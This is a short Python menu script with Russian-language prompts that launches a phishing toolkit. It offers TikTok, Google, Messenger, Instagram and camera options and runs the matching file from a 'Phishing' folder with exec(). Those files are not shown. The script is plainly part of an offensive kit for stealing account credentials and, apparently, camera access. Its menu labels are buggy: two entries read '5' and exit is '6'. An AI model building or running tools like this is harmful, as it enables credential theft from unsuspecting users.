import os

print('1 - tiktok')
print ('2 - google')
print('3 - mesenger')
print('4 - instagram')
print('5 - camera')
print('5 - exit')

phish = input('Добро пожаловать на PT. Выбирите что вы хотите сделать: ')

if phish == '1':
    try:
        with open('Phishing/Tiktok.py', 'r', encoding='utf-8') as file:
            os.system('cls')
            exec(file.read())
    except FileNotFoundError:
        print("Файл 'Phishing.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")

if phish =='2':
    try:
        with open('Phishing/Google.py', 'r', encoding='utf-8')as google:
            os.system('cls')
            exec(google.read())
    except FileNotFoundError:
        print("Файл 'GooglePhishing.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")

if phish =='3':
    try:
        with open('Phishing/Mesenger.py', 'r', encoding='utf-8')as google:
            os.system('cls')
            exec(google.read())
    except FileNotFoundError:
        print("Файл 'Mesenger.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")
        
if phish =='4':
    try:
        with open('Phishing/insta.py', 'r', encoding='utf-8')as google:
            os.system('cls')
            exec(google.read())
    except FileNotFoundError:
        print("Файл insta.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")

if phish =='5':
    try:
        with open('Phishing/camera.py', 'r', encoding='utf-8')as google:
            os.system('cls')
            exec(google.read())
    except FileNotFoundError:
        print("Файл camera.py' не найден.")
    except Exception as e:
        print(f"Произошла ошибка при выполнении файла: {e}")

if phish == '6':
    exit()
